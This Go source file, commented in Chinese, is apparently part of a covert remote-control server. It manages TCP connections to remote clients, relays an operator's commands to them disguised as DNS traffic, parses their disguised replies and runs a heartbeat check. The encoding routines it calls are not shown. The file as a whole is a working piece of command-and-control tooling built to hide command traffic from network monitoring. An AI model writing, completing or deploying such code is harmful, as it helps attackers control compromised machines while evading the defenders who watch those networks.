/*
DNS伪装客户端管理器

功能说明：
- 管理与客户端的DNS伪装通信
- 将控制端的普通命令转换为DNS伪装格式发送给客户端
- 接收客户端的DNS伪装响应并解析为普通文本返回给控制端
- 维护客户端连接状态和心跳检测
*/

package server

import (
	"fmt"
	"net"
	"sync"
	"time"
)

// Client 表示连接到服务器的客户端，使用DNS伪装通信
type Client struct {
	ID          int        // 客户端唯一标识符
	conn        net.Conn   // TCP连接（用于传输DNS伪装数据）
	writerMu    sync.Mutex // 写操作互斥锁
	isConnected bool       // 连接状态
	server      *Server    // 服务器引用，用于访问DNS伪装函数
}

// NewClient 创建新的客户端实例
func NewClient(id int, conn net.Conn, server *Server) *Client {
	return &Client{
		ID:          id,
		conn:        conn,
		server:      server,
		isConnected: true,
	}
}

// Start 开始客户端处理，维持连接并进行心跳检测
func (c *Client) Start() {
	defer func() {
		c.isConnected = false
		c.conn.Close()
		fmt.Printf("客户端 #%d 连接已关闭\n", c.ID)
	}()

	// 简单的心跳检测，保持连接活跃
	heartbeatTicker := time.NewTicker(60 * time.Second)
	defer heartbeatTicker.Stop()

	for {
		select {
		case <-heartbeatTicker.C:
			if !c.isConnected {
				return
			}
			// 可以在这里发送心跳检测命令
			// 目前只是检查连接状态
		default:
			if !c.isConnected {
				return
			}
			time.Sleep(1 * time.Second)
		}
	}
}

// SendCommand 向客户端发送DNS伪装的命令并获取响应
func (c *Client) SendCommand(cmd string) (string, error) {
	if !c.isConnected {
		return "", fmt.Errorf("客户端 #%d 已断开连接", c.ID)
	}

	// 设置读写超时以防止永久阻塞
	c.conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	c.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	defer func() {
		c.conn.SetWriteDeadline(time.Time{})
		c.conn.SetReadDeadline(time.Time{})
	}()

	// 通过DNS伪装发送命令到客户端
	c.writerMu.Lock()
	err := c.sendDNSCommand(cmd)
	c.writerMu.Unlock()

	if err != nil {
		c.isConnected = false
		return "", fmt.Errorf("发送DNS伪装命令失败: %w", err)
	}

	// 从客户端读取DNS伪装的响应
	result, err := c.readDNSResponse()
	if err != nil {
		c.isConnected = false
		return "", fmt.Errorf("读取DNS伪装响应失败: %w", err)
	}

	return result, nil
}

// GetInfo 返回客户端信息
func (c *Client) GetInfo() string {
	return fmt.Sprintf("客户端 #%d - %s", c.ID, c.conn.RemoteAddr())
}

// Close 关闭客户端连接
func (c *Client) Close() {
	c.isConnected = false
	c.conn.Close()
}

// sendDNSCommand 使用DNS伪装向客户端发送命令
func (c *Client) sendDNSCommand(command string) error {
	// 获取控制器实例来访问DNS伪装函数
	// 这里我们通过server来获取当前活动的控制器
	if len(c.server.controllers) == 0 {
		return fmt.Errorf("没有活动的控制器")
	}

	// 获取第一个控制器（简化处理）
	var controller *Controller
	for ctrl := range c.server.controllers {
		controller = ctrl
		break
	}

	if controller == nil {
		return fmt.Errorf("无法获取控制器实例")
	}

	// 使用控制器的DNS伪装函数发送命令
	return controller.sendDNSCommandToClient(c.conn, command)
}

// readDNSResponse 从客户端读取DNS伪装的响应
func (c *Client) readDNSResponse() (string, error) {
	// 获取控制器实例来访问DNS伪装函数
	if len(c.server.controllers) == 0 {
		return "", fmt.Errorf("没有活动的控制器")
	}

	// 获取第一个控制器（简化处理）
	var controller *Controller
	for ctrl := range c.server.controllers {
		controller = ctrl
		break
	}

	if controller == nil {
		return "", fmt.Errorf("无法获取控制器实例")
	}

	// 使用控制器的DNS伪装函数读取响应
	return controller.readDNSResponseFromClient(c.conn)
}
